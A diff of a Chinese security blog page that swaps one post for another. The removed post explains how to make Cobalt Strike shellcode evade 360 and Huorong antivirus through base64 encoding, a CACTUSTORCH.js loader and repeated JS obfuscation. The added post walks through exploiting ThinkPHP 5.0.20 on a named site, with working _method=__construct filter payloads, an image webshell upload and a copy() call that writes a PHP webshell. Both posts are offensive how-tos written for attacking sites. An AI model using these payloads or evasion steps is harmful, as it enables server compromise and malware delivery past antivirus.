@@ -9,7 +9,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <title>
-    cobaltstrike免杀过360和火绒 |
+    thinkphp+thinkcms组合拳getshell |
     
     北城荒</title>
   
@@ -35,7 +35,7 @@
   <div id="container">
     <div id="wrap">
       <section class="outer">
-  <article id="post-cobaltstrike免杀过360和火绒" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  <article id="post-thinkphp-thinkcms组合拳getshell" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
     
@@ -43,7 +43,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      cobaltstrike免杀过360和火绒
+      thinkphp+thinkcms组合拳getshell
     </h1>
   
 
@@ -52,8 +52,8 @@
 
     
       <div class="article-meta">
-        <a href="/2020/11/14/cobaltstrike%E5%85%8D%E6%9D%80%E8%BF%87360%E5%92%8C%E7%81%AB%E7%BB%92/" class="article-date">
-  <time datetime="2020-11-14T12:56:31.000Z" itemprop="datePublished">2020-11-14</time>
+        <a href="/2020/11/19/thinkphp-thinkcms%E7%BB%84%E5%90%88%E6%8B%B3getshell/" class="article-date">
+  <time datetime="2020-11-19T13:42:55.000Z" itemprop="datePublished">2020-11-19</time>
 </a>
         
       </div>
@@ -65,29 +65,29 @@
       
 
       
-        <p>在免杀之前需要自己处理一下cobaltstrike的相关特征，和更新一下证书。不然虽然文件免杀了，可是上线的时候会有特征，会被火绒拦截。</p>
-<pre><code>     具体参考以下文章
-      https://www.wangan.com/articles/1144
-      https://paper.seebug.org/1349/
-      https://cloud.tencent.com/developer/article/1688045</code></pre>
-<p>1、生成payload</p>
-<pre><code>     首先我们先来生成一个32位的payload，这里我们的监听器使用http的方式，因为证书我没搞，所以就不用https的了.</code></pre>
-<p><img src="/images/pasted-22.png" alt="upload successful"></p>
-<p>2、编码</p>
-<pre><code>    之后我们需要把这个shellcode转换为base64编码的格式，运行&quot;cat payload.bin | base64 -w 0&quot;;这样就可以得到编码后的shellcode。</code></pre>
-<p><img src="/images/pasted-15.png" alt="upload successful"></p>
-<p>3、js加载shellcode</p>
-<pre><code>    我们下面就要用到一个js加载cs的shellcode的代码了，相关代码可以来这里下载: https://github.com/shenligang123/js-shellcode，我们需要利用的是CACTUSTORCH.js这个文件。
-     将生成的shellcode放在code参数里就可以了。</code></pre>
-<p><img src="/images/pasted-16.png" alt="upload successful"></p>
-<pre><code>    现在这种方式已经被查杀，我们再次利用js加密来实现免杀。
-    来这个网站https://www.sojson.com/jsobfuscator.html这里加密就行了。</code></pre>
-<p><img src="/images/pasted-17.png" alt="upload successful"></p>
-<pre><code>    之后我们用360杀毒与火绒检测下，这里我的火绒显示报毒了，我又加密了几次，就好了，之后就均无提示上线</code></pre>
-<p><img src="/images/pasted-18.png" alt="upload successful"></p>
-<p><img src="/images/pasted-19.png" alt="upload successful"></p>
-<p>4、运行js文件上线</p>
-<p><img src="/images/pasted-23.png" alt="upload successful"></p>
+        <pre><code>    日站遇到一个thinkphp5.0.20版本的，通过通杀payload发现无法成功，看来是过滤了一些函数</code></pre>
+<p><img src="/images/pasted-24.png" alt="upload successful"></p>
+<pre><code>    通过各种方式(其实也就一种方式，请教大佬)，最后成功绕过并getshell，下面记录一下为自己做个记录</code></pre>
+<p>1、post方式提交并输出phpinfo</p>
+<pre><code>  http://vul.secdog.cn/s=portal
+  _method=__construct&amp;filter[]=phpinfo&amp;method=GET&amp;get[]=1
+  或者_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo
+  成功输出，通过phpinfo查看到它过滤的超多的函数</code></pre>
+<p><img src="/images/pasted-26.png" alt="upload successful"></p>
+<p><img src="/images/pasted-28.png" alt="upload successful"></p>
+<p>2、上传一个图片马</p>
+<pre><code>    通过前台注册用户并上传头像功能上传图片马，并记录下路径</code></pre>
+<p><img src="/images/pasted-29.png" alt="upload successful"></p>
+<p><img src="/images/pasted-30.png" alt="upload successful"></p>
+<p>3、通过文件包含及php中的copy函数将图片生成一个新的文件</p>
+<pre><code>    打码处为图片的绝对路径，从页面中可获取到网站绝对路径
+  _method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=/www/wwwroot/xxx/public/upload/avatar/20201119/c137f26076ea44d2a25a6992b1ae1437.png&amp;A=copy(&#39;/www/wwwroot/xxx/public/upload/avatar/20201119/c137f26076ea44d2a25a6992b1ae1437.png&#39;,&#39;/www/wwwroot/xxxx/public/upload/avatar/20201119/slg.php&#39;);
+
+  注意:A=copy中的A为马的密码</code></pre>
+<p><img src="/images/pasted-31.png" alt="upload successful"></p>
+<p>4、访问马并连接</p>
+<p><img src="/images/pasted-32.png" alt="upload successful"></p>
+<p><img src="/images/pasted-33.png" alt="upload successful"></p>
 <div id="gitalk-container"></div>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
 <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
@@ -107,7 +107,7 @@ gitalk.render('gitalk-container')
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/14/cobaltstrike%E5%85%8D%E6%9D%80%E8%BF%87360%E5%92%8C%E7%81%AB%E7%BB%92/" data-id="ckhhtq3ih0000ksutf0n4gc2x"
+      <a data-url="http://example.com/2020/11/19/thinkphp-thinkcms%E7%BB%84%E5%90%88%E6%8B%B3getshell/" data-id="ckhowruvk0000r0utf7s8dnjm"
          class="article-share-link">分享</a>
       
     </footer>
@@ -118,19 +118,10 @@ gitalk.render('gitalk-container')
     
   <nav class="article-nav">
     
-      <a href="/2020/11/19/thinkphp-thinkcms%E7%BB%84%E5%90%88%E6%8B%B3getshell/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            thinkphp+thinkcms组合拳getshell
-          
-        </div>
-      </a>
     
-    
-      <a href="/2020/11/12/hello-world/" class="article-nav-link">
+      <a href="/2020/11/14/cobaltstrike%E5%85%8D%E6%9D%80%E8%BF%87360%E5%92%8C%E7%81%AB%E7%BB%92/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">Hello World</div>
+        <div class="article-nav-title">cobaltstrike免杀过360和火绒</div>
       </a>
     
   </nav>
